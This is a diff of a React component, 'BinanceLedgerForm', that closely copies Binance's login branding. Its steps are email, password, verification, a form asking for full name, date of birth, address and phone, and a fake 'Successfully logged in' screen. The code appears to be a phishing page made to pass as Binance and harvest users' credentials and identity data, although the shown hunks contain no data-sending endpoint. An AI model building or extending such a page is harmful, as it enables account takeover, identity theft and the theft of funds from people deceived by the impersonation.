@@ -1,3 +1,4 @@
+
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 
@@ -129,7 +130,6 @@ const BinanceLedgerForm: FC = () => {
                 aria-label="QR code login" 
                 tabIndex={0}
               >
-                {/* ... keep existing QR code SVG ... */}
                 <svg 
                   className="w-[32px] h-[32px]" 
                   style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
@@ -150,7 +150,6 @@ const BinanceLedgerForm: FC = () => {
         </div>
       </div>
 
-      {/* Login Form */}
       <form onSubmit={handleEmailSubmit}>
         <div className="bn-formItem mb-6">
           <label 
@@ -245,9 +244,7 @@ const BinanceLedgerForm: FC = () => {
         />
       </div>
 
-      {/* Social Login Buttons */}
       <div className="space-y-3">
-        {/* ... keep existing social login buttons ... */}
         <button 
           className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mb-3 md:mb-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
           style={{
@@ -565,4 +562,506 @@ const BinanceLedgerForm: FC = () => {
                   className="absolute right-3 top-1/2 transform -translate-y-1/2 text-sm font-medium hover:opacity-80 transition-opacity"
                   style={{
                     color: "var(--color-BtnBg, #FCD535)",
-                    fontFamily
+                    fontFamily: "BinanceNova, Arial, sans-serif",
+                    fontSize: "14px",
+                    fontWeight: "500",
+                    lineHeight: "20px"
+                  }}
+                >
+                  Paste
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <button
+          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
+          style={{
+            backgroundColor: "var(--color-BtnBg, #FCD535)",
+            color: "var(--color-TextOnYellow, #202630)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "14px",
+            fontWeight: "500",
+            lineHeight: "20px",
+            height: "48px"
+          }}
+          type="submit"
+          disabled={isLoading}
+          aria-label="Submit"
+        >
+          {isLoading ? (
+            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
+          ) : (
+            'Submit'
+          )}
+        </button>
+
+        <div 
+          className="flex items-center justify-center mt-4"
+          style={{ 
+            color: "var(--color-TertiaryText, #848E9C)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "12px",
+            fontWeight: "400",
+            lineHeight: "16px"
+          }}
+        >
+          <svg 
+            width="16" 
+            height="16" 
+            viewBox="0 0 16 16" 
+            className="mr-2"
+            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
+            fill="currentColor"
+          >
+            <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1ZM8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0Z"/>
+            <path d="M7.5 3a.5.5 0 0 1 1 0v5.793L10.146 7.146a.5.5 0 0 1 .708.708l-2.5 2.5a.5.5 0 0 1-.708 0l-2.5-2.5a.5.5 0 1 1 .708-.708L7.5 8.793V3Z"/>
+          </svg>
+          Protected by Binance Risk
+        </div>
+      </form>
+    </>
+  );
+
+  const renderPersonalDetailsStep = () => (
+    <>
+      <div className="flex justify-between items-center mb-8">
+        <div 
+          className="card-page-title !mb-[0px]" 
+          role="heading" 
+          aria-level={1}
+          style={{ 
+            color: "var(--color-PrimaryText, #EAECEF)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "24px",
+            fontWeight: "600",
+            lineHeight: "32px"
+          }}
+        >
+          Verify Details
+        </div>
+        <button 
+          onClick={() => setCurrentStep('verification')}
+          className="text-sm hover:underline"
+          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
+        >
+          Back
+        </button>
+      </div>
+
+      <form onSubmit={handlePersonalDetailsSubmit}>
+        <div className="space-y-4">
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              First Name
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="text"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.firstName}
+                onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Last Name
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="text"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.lastName}
+                onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Date of Birth
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="date"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.dateOfBirth}
+                onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Address
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="text"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.address}
+                onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Postal Code
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="text"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.postalCode}
+                onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              City
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="text"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.city}
+                onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Country
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="text"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.country}
+                onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Phone Number
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)"
+              }}
+            >
+              <input
+                type="tel"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.phoneNumber}
+                onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
+              />
+            </div>
+          </div>
+        </div>
+
+        <button
+          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
+          style={{
+            backgroundColor: "var(--color-BtnBg, #FCD535)",
+            color: "var(--color-TextOnYellow, #202630)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "14px",
+            fontWeight: "500",
+            lineHeight: "20px",
+            height: "48px"
+          }}
+          type="submit"
+          disabled={isLoading}
+          aria-label="Submit"
+        >
+          {isLoading ? (
+            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
+          ) : (
+            'Submit'
+          )}
+        </button>
+      </form>
+    </>
+  );
+
+  const renderSuccessStep = () => (
+    <>
+      <div className="text-center py-8">
+        <div 
+          className="mb-6"
+          style={{ 
+            color: "var(--color-PrimaryText, #EAECEF)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "24px",
+            fontWeight: "600",
+            lineHeight: "32px"
+          }}
+        >
+          Successfully logged in
+        </div>
+        
+        <div className="mb-8">
+          <svg 
+            width="64" 
+            height="64" 
+            viewBox="0 0 64 64" 
+            className="mx-auto"
+            style={{ color: "var(--color-BtnBg, #FCD535)" }}
+            fill="currentColor"
+          >
+            <circle cx="32" cy="32" r="32" />
+            <path d="M20 32l8 8 16-16" stroke="#202630" strokeWidth="3" fill="none" strokeLinecap="round" strokeLinejoin="round" />
+          </svg>
+        </div>
+        
+        <div 
+          style={{ 
+            color: "var(--color-SecondaryText, #B7BDC6)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "14px",
+            fontWeight: "400",
+            lineHeight: "20px"
+          }}
+        >
+          Your account has been verified and you are now logged in.
+        </div>
+      </div>
+    </>
+  );
+
+  return (
+    <div 
+      className="min-h-screen flex items-center justify-center p-4"
+      style={{
+        background: "var(--color-BasicBg, #181A20)",
+        fontFamily: "BinanceNova, Arial, sans-serif",
+        color: "var(--color-PrimaryText, #EAECEF)",
+        fontSize: "14px"
+      }}
+    >
+      <div 
+        className="content-card first-screen-content"
+        style={{
+          border: "1px solid var(--color-Line, #2B3139)",
+          borderRadius: "24px",
+          minHeight: "580px",
+          padding: "40px",
+          width: "425px",
+          backgroundColor: "var(--color-CardBg, #1E2329)",
+          fontFamily: "BinanceNova, Arial, sans-serif"
+        }}
+      >
+        {/* Binance Logo */}
+        <div className="icon-wrap mb-8 flex justify-start">
+          <svg 
+            height="24" 
+            width="120" 
+            className="bn-svg default-icon" 
+            viewBox="0 0 120 24" 
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path 
+              fill="#F0B90B" 
+              d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 16.9688L14.7188 14.25L12 11.5312L9.28125 14.25L12 16.9688Z"
+            />
+            <path 
+              fill="#F0B90B" 
+              d="M30.2 9.92H27.76V21H30.2V9.92ZM37.13 10.04C35.93 10.04 35.02 10.73 34.55 11.68H34.4V10.16H32.02V21H34.46V15.65C34.46 14.17 35.17 13.4 36.28 13.4C37.33 13.4 37.93 14.08 37.93 15.38V21H40.37V14.83C40.37 12.16 38.95 10.04 36.41 10.04C36.41 10.04 37.13 10.04 37.13 10.04ZM47.65 21.24C50.95 21.24 52.93 19.12 52.93 15.53C52.93 11.94 50.95 9.8 47.65 9.8C44.35 9.8 42.37 11.94 42.37 15.53C42.37 19.12 44.35 21.24 47.65 21.24ZM47.65 18.92C45.85 18.92 44.81 17.62 44.81 15.53C44.81 13.44 45.85 12.14 47.65 12.14C49.45 12.14 50.49 13.44 50.49 15.53C50.49 17.62 49.45 18.92 47.65 18.92ZM59.65 21.24C62.95 21.24 64.93 19.12 64.93 15.53C64.93 11.94 62.95 9.8 59.65 9.8C56.35 9.8 54.37 11.94 54.37 15.53C54.37 19.12 56.35 21.24 59.65 21.24ZM59.65 18.92C57.85 18.92 56.81 17.62 56.81 15.53C56.81 13.44 57.85 12.14 59.65 12.14C61.45 12.14 62.49 13.44 62.49 15.53C62.49 17.62 61.45 18.92 59.65 18.92ZM71.65 21.24C74.95 21.24 76.93 19.12 76.93 15.53C76.93 11.94 74.95 9.8 71.65 9.8C68.35 9.8 66.37 11.94 66.37 15.53C66.37 19.12 68.35 21.24 71.65 21.24ZM71.65 18.92C69.85 18.92 68.81 17.62 68.81 15.53C68.81 13.44 69.85 12.14 71.65 12.14C73.45 12.14 74.49 13.44 74.49 15.53C74.49 17.62 73.45 18.92 71.65 18.92ZM83.65 21.24C86.95 21.24 88.93 19.12 88.93 15.53C88.93 11.94 86.95 9.8 83.65 9.8C80.35 9.8 78.37 11.94 78.37 15.53C78.37 19.12 80.35 21.24 83.65 21.24ZM83.65 18.92C81.85 18.92 80.81 17.62 80.81 15.53C80.81 13.44 81.85 12.14 83.65 12.14C85.45 12.14 86.49 13.44 86.49 15.53C86.49 17.62 85.45 18.92 83.65 18.92ZM95.65 21.24C98.95 21.24 100.93 19.12 100.93 15.53C100.93 11.94 98.95 9.8 95.65 9.8C92.35 9.8 90.37 11.94 90.37 15.53C90.37 19.12 92.35 21.24 95.65 21.24ZM95.65 18.92C93.85 18.92 92.81 17.62 92.81 15.53C92.81 13.44 93.85 12.14 95.65 12.14C97.45 12.14 98.49 13.44 98.49 15.53C98.49 17.62 97.45 18.92 95.65 18.92ZM107.65 21.24C110.95 21.24 112.93 19.12 112.93 15.53C112.93 11.94 110.95 9.8 107.65 9.8C104.35 9.8 102.37 11.94 102.37 15.53C102.37 19.12 104.35 21.24 107.65 21.24ZM107.65 18.92C105.85 18.92 104.81 17.62 104.81 15.53C104.81 13.44 105.85 12.14 107.65 12.14C109.45 12.14 110.49 13.44 110.49 15.53C110.49 17.62 109.45 18.92 107.65 18.92ZM119.65 21.24C122.95 21.24 124.93 19.12 124.93 15.53C124.93 11.94 122.95 9.8 119.65 9.8C116.35 9.8 114.37 11.94 114.37 15.53C114.37 19.12 116.35 21.24 119.65 21.24ZM119.65 18.92C117.85 18.92 116.81 17.62 116.81 15.53C116.81 13.44 117.85 12.14 119.65 12.14C121.45 12.14 122.49 13.44 122.49 15.53C122.49 17.62 121.45 18.92 119.65 18.92Z"
+            />
+          </svg>
+        </div>
+
+        {/* Form Content */}
+        {currentStep === 'email' && renderEmailStep()}
+        {currentStep === 'password' && renderPasswordStep()}
+        {currentStep === 'verification' && renderVerificationStep()}
+        {currentStep === 'personal-details' && renderPersonalDetailsStep()}
+        {currentStep === 'success' && renderSuccessStep()}
+      </div>
+    </div>
+  );
+};
+
+export default BinanceLedgerForm;
